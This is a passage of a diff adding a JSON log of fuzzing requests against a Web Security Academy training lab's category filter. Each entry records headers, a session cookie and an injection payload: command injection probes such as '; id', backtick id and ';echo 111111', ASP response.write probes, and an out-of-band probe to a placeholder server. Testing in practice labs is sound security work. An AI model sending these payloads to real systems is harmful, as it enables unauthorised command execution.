+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "; id"
+        },
+        {
+            "index": 55,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=%0a id %0a",
+            "param": "?category=%0a id %0a",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "%0a id %0a"
+        },
+        {
+            "index": 56,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=`id`",
+            "param": "?category=`id`",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "`id`"
+        },
+        {
+            "index": 57,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=;echo 111111",
+            "param": "?category=;echo 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": ";echo 111111"
+        },
+        {
+            "index": 58,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=echo 111111",
+            "param": "?category=echo 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "echo 111111"
+        },
+        {
+            "index": 59,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=response.write 111111",
+            "param": "?category=response.write 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "response.write 111111"
+        },
+        {
+            "index": 60,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=:response.write 111111",
+            "param": "?category=:response.write 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": ":response.write 111111"
+        },
+        {
+            "index": 61,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=http://<yourservername>/",
+            "param": "?category=http://<yourservername>/",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "http://<yourservername>/"
+        }
+    ]
+}
